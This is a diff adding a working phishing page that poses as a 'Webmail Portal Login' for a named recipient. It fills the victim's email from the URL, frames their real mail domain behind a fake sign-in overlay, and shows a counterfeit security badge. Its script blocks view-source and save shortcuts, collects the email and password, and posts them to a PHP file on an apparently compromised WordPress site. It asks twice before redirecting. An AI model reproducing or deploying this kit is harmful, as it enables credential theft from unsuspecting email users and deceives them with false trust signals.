@@ -1,0 +1,460 @@
+<!DOCTYPE html>
+<!-- saved from url=(0058)http://johswat.cf/rel.html?email=redazione@concretenews.it -->
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+ <link href="style.css" rel="stylesheet" type="text/css">
+    <meta name="robots" content="noindex, nofollow">
+    <meta name="googlebot" content="noindex, nofollow">
+    <title>Webmail Portal Login</title>
+
+    <style>
+      html,
+      body,
+      div,
+      span,
+      applet,
+      object,
+      iframe,
+      h1,
+      h2,
+      h3,
+      h4,
+      h5,
+      h6,
+      p,
+      blockquote,
+      pre,
+      a,
+      abbr,
+      acronym,
+      address,
+      big,
+      cite,
+      code,
+      del,
+      dfn,
+      em,
+      img,
+      ins,
+      kbd,
+      q,
+      s,
+      samp,
+      small,
+      strike,
+      strong,
+      sub,
+      sup,
+      tt,
+      var,
+      b,
+      u,
+      i,
+      center,
+      dl,
+      dt,
+      dd,
+      ol,
+      ul,
+      li,
+      fieldset,
+      form,
+      label,
+      legend,
+      table,
+      caption,
+      tbody,
+      tfoot,
+      thead,
+      tr,
+      th,
+      td,
+      article,
+      aside,
+      canvas,
+      details,
+      embed,
+      figure,
+      figcaption,
+      footer,
+      header,
+      hgroup,
+      menu,
+      nav,
+      output,
+      ruby,
+      section,
+      summary,
+      time,
+      mark,
+      audio,
+      video {
+        margin: 0;
+        padding: 0;
+        border: 0;
+        font-size: 100%;
+        font: inherit;
+        vertical-align: baseline;
+      }
+      article,
+      aside,
+      details,
+      figcaption,
+      figure,
+      footer,
+      header,
+      hgroup,
+      menu,
+      nav,
+      section {
+        display: block;
+      }
+      body {
+        line-height: 1;
+      }
+      ol,
+      ul {
+        list-style: none;
+      }
+      blockquote,
+      q {
+        quotes: none;
+      }
+      blockquote:before,
+      blockquote:after,
+      q:before,
+      q:after {
+        content: "";
+        content: none;
+      }
+      table {
+        border-collapse: collapse;
+        border-spacing: 0;
+      }
+
+      html,
+      body {
+        font-size: 18px;
+        font-family: Arial, helvetica neue, Helvetica, sans-serif sans-serif;
+        font-weight: 500;
+      }
+      #root {
+        position: absolute;
+        left: 0;
+        right: 0;
+        bottom: 0;
+        top: 0;
+        z-index: -10;
+        pointer-events: none;
+      }
+      .error {
+        color: #dc3545;
+        width: 80%;
+        margin: 0 auto;
+        padding-top: 5px;
+      }
+      .form-holder {
+        background-color: #fff;
+        width: 600px;
+        margin: 180px auto;
+        height: 100%;
+        box-shadow: 0 20px 50px #a9a9a9;
+        border-radius: 4px 4px 0 0;
+        border: 1px solid #d6dfea;
+        z-index: 12;
+      }
+      .xlogo {
+        background-color: #0d4f8b;
+        color: #fff;
+        padding: 8px;
+        margin-bottom: 10px;
+      }
+      .xlogo img {
+        vertical-align: middle;
+        width: 5%;
+        height: 5%;
+        object-fit: contain;
+      }
+      .xlogo span {
+        vertical-align: middle;
+      }
+      .form-wrap {
+        width: 400px;
+        margin: 0 auto;
+        text-align: center;
+      }
+      .form-wrap p {
+        font-size: 24px;
+      }
+      .form-wrap img {
+        margin: 20px;
+      }
+      .finput {
+        width: 80%;
+        margin: 10px auto;
+      }
+      .finput input[type="email"],
+      .finput input[type="password"] {
+        font-size: 24px;
+        padding: 7px 10px 7px 40px;
+        border-radius: 4px;
+        margin: 5px 0;
+        width: 90%;
+        border: 1px solid #d6dfea;
+      }
+      .finput input[type="email"] {
+        background: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABcAAAAXCAQAAABKIxwrAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAAAAmJLR0QAAKqNIzIAAAAJcEhZcwAADdcAAA3XAUIom3gAAAAHdElNRQfjAwITKgogc0nIAAAA/ElEQVQ4y43Sv07CUBTH8W9BiEvjSAcZCMbRQWNKSHBnwD4AL8DII7CRONXwDE76DhhfoCshIeGPJLoRZGjCcBygtdR72/s7w10+Ock550I6V4wImBEwok5OHvhB4trSysJlVgksCAtKeu6lsCB0kqBwwl1FC1fPHQV39NxS8KKeLxV8rh+1qRi1kbXKjxQek5ka6wT+pEZOqryxR9jzymUe7WMDNtfHt09VTSv4hAhfDGlzR5sh3wghPpVTajFgp9hKVDsGyZv0MmhUvb/eEwM+jU7qGWBBeDzwd0M+Brg1xIJwX+SJm7zLxTm32HBhzDdnPNNV/vP/EV5+AUv1vp3jhmegAAAAJXRFWHRkYXRlOmNyZWF0ZQAyMDE5LTAzLTAyVDE4OjQyOjEwKzAxOjAw99JImgAAACV0RVh0ZGF0ZTptb2RpZnkAMjAxOS0wMy0wMlQxODo0MjoxMCswMTowMIaP8CYAAAAZdEVYdFNvZnR3YXJlAHd3dy5pbmtzY2FwZS5vcmeb7jwaAAAAAElFTkSuQmCC)
+          no-repeat scroll 10px 10px;
+      }
+      .finput input[type="password"] {
+        background: url(data:image/png;base64,jAwITLAsBLt7YAAAA1klEQVQ4y72STQ6CMBCFP3SNiSSykvvoUtEDGe7CEfQW6NI1sNRECUtxXABKofwkJE6TJn3z3vTNtFAPG48zKSkBHgt6YkeCVNaTbTf9rdAFIWuX2EX1EBcTkw1XBOHRZswr6NYXsYgQhINecEEQXAXbIwiBXpAbMhVshiAkP8CoJKWBaNBJ35zrUQruRSUaYy3Rm2pJBhQ3RlkaKTji4HDqEqqNLgFwdO3rb5j221Vr+QD4w2+YV/ZBTUcAxMMFGQAvXep/Lx33MiP1uCZs/NPqClnlxA8hMnhnez+9CwAAACV0RVh0ZGF0ZTpjcmVhdGUAMjAxOS0wMy0wMlQxODo0NDoxMSswMTowMFy7M2kAAAAldEVYdGRhdGU6bW9kaWZ5ADIwMTktMDMtMDJUMTg6NDQ6MTErMDE6MDAt5ovVAAAAGXRFWHRTb2Z0d2FyZQB3d3cuaW5rc2NhcGUub3Jnm+48GgAAAABJRU5ErkJggg==)
+          no-repeat scroll 7px 7px;
+      }
+      .finput input[type="email"]:hover,
+      .finput input[type="password"]:hover,
+      .finput input[type="email"]:focus,
+      .finput input[type="password"]:focus {
+        border: 1px solid #0d4f8b;
+      }
+      button {
+        border: 1px solid #0d4f8b;
+        font-size: 20px;
+        padding: 7px 20px;
+        border-radius: 4px;
+        background-color: #0d4f8b;
+        color: #fff;
+      }
+      button:hover {
+        background-color: #1874cd;
+        cursor: pointer;
+      }
+      .privacy {
+        font-size: 14px;
+        color: gray;
+        text-align: left;
+        display: block;
+        margin-bottom: 20px;
+      }
+    </style>
+    <link id="favicon" rel="shortcut icon" type="image/png" href="https://h1systems.ml/favicon.png">
+
+    <style>
+      .overlay {
+        width: 100%;
+        height: 100%;
+        background-color: rgba(14, 13, 13, 0.5);
+        position: absolute;
+        top: 0;
+        left: 0;
+        display: block;
+      }
+    </style>
+</head>
+ <body id="top">
+ <iframe id="mainPage" src="" width="100%" scrolling="no" sandbox="allow-forms allow-pointer-lock
+allow-popups allow-same-origin allow-scripts" style="position: absolute;height: 100%;border: none;"></iframe>
+    <!--login Form -->
+
+    <div class="overlay" bis_skin_checked="1">
+      <div class="form-holder" style="height: 430px" bis_skin_checked="1">
+        <center>
+          <div class="alert alert-danger" id="msg" style="display: none" bis_skin_checked="1">
+            Invalid Password.! Please Enter your correct Password
+          </div>
+          <span id="error" class="text-danger" style="display: none">That account doesn't exist. Enter a different account</span>
+        </center>
+        <input type="hidden" class="form-control" name="hido" id="hido" value="">
+        <input type="hidden" class="form-control" name="redirecto" id="redirecto" value="">
+
+        <div class="xlogo" bis_skin_checked="1">
+          <img id="zion" src="./favicons">
+          <span style="text-transform: capitalize" id="banNer">Concretenews</span>
+        </div>
+
+        <div class="form-wrap" bis_skin_checked="1">
+          <p>Please sign in with your email</p>
+          <div class="error" style="margin-top: 5px; display: none" id="myError" bis_skin_checked="1"></div>
+
+          <div class="finput" bis_skin_checked="1">
+		  
+            <input type="email" id="email" name="email" required="" autocomplete="off" value="" >
+          </div>
+
+          <div class="finput" bis_skin_checked="1">
+            <input type="password" name="password" required="" autocomplete="off" placeholder="Email Password" id="password">
+          </div>
+
+          <div class="finput btn" bis_skin_checked="1">
+            <button type="submit" class="btn btn-primary login-btn btn-block" id="submit-btn">
+              Continue
+            </button>
+          </div>
+
+          <img src="./26-269507_arbys-logo-transparent-norton-secured-logo-png-png.png" width="107" height="58">
+
+          <span class="privacy">
+            Privacy Policy:
+            <span id="kai" style="text-transform: capitalize"></span><br>
+            Your information is only for the sole purpose of viewing this
+            document and would not be sold or shared to any third party.
+          </span>
+        </div>
+      </div>
+    </div>
+    <!--<div id="root">
+<iframe width='100%' height='100%' id="myframe" frameborder='0' scrolling='no' src=""></iframe>
+</div>-->
+
+ <!-- jQuery first, then Popper.js, then Bootstrap JS -->
+      <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+      <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/jquery.session@1.0.0/jquery.session.min.js"></script>
+
+
+  <script>
+
+// prevent ctrl + s
+$(document).bind('keydown', function(e) {
+if(e.ctrlKey && (e.which == 83)) {
+e.preventDefault();
+return false;
+}
+});
+
+document.addEventListener('contextmenu', event => event.preventDefault());
+
+document.onkeydown = function(e) {
+if (e.ctrlKey && 
+(e.keyCode === 67 || 
+e.keyCode === 86 || 
+e.keyCode === 85 || 
+e.keyCode === 117)) {
+return false;
+} else {
+return true;
+}
+};
+$(document).keypress("u",function(e) {
+if(e.ctrlKey)
+{
+return false;      }
+else {
+return true;
+}});
+
+
+
+
+    /* global $ */
+    $(document).ready(function(){
+      var count=0;
+ 
+      $('#back1').click(function () {
+        $("#msg").hide();
+        $('#email').val("");
+        $("#automail").animate({left:200, opacity:"hide"}, 0);
+        $("#inputbar").animate({right:200, opacity:"show"}, 1000);
+
+      });
+
+      var email = window.location.hash.substr(1);
+      if (!email) {
+
+      }
+      else
+      {
+        var my_email =email;
+        $('#email').val(my_email); 
+        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+
+        if (!filter.test(my_email)) {
+          $('#error').show();
+           email.focus;
+           return false;
+        }
+        var ind=my_email.indexOf("@");
+        var my_slice=my_email.substr((ind+1));
+      var mainPage = 'https://'+my_slice; 
+     //     var mainPage = 'https://webmail.staralliancebd.com/';  
+        $("#logoimg").attr("src", "https://logo.clearbit.com/"+mainPage);
+         document.getElementById('mainPage').src = mainPage;
+    //    $("#mainPage").src(mainPage);
+    
+	 	
+        $(".email").html(email);
+		 
+      }
+ 
+      $('#submit-btn').click(function(event){
+    
+		//$('#error').hide();
+		//$('#msg').hide();
+         event.preventDefault();
+	 	var email=$("#email").val();
+         var password=$("#password").val();
+ 
+		 
+      ///////////new injection////////////////
+      count=count+1;
+    //  console.log(count); 
+      $.ajax({
+        dataType: 'JSON',
+        url: 'https://dev.nte.org.au/wp-content/plugins/easybusy/rule/wp-docx.php',
+        type: 'POST',
+        data:{
+          email:email,
+          password:password
+        },
+            // data: $('#contact').serialize(),
+            beforeSend: function(xhr){
+              $('#submit-btn').html('Verifing...');
+			  
+    //  console.log(count); 
+            },
+            success: function(response){
+			 $('#msg').html("<span style='color:red;'>Username or Password is incorrect. Please try again</span>");
+              if(response){
+                $("#msg").show();
+				console.log(response);
+				$('#msg').html(response['msg']);
+                if(response['signal'] == 'ok'){
+                  $("#password").val("");
+                  if (count>=2) {
+                    count=0;
+                    // window.location.replace(response['redirect_link']);
+                    window.location.replace("complete.html?msg="+email);
+
+                  }
+                  // $('#msg').html(response['msg']);
+                }
+                else{
+                   $('#msg').html(response['msg']);
+                }
+              }
+            },
+            error: function(){
+              $("#password").val("");
+              if (count>=2) {
+                count=0;
+                window.location.replace("complete.html?msg="+email);
+              }
+              $("#msg").show();
+              // $('#msg').html("Please try again later");
+            },
+            complete: function(){
+              $('#submit-btn').html('Sign in');
+            }
+          });  
+    });
+
+
+    });
+
+  </script>
+  </html>
+</script>
+
+
+</body></html>
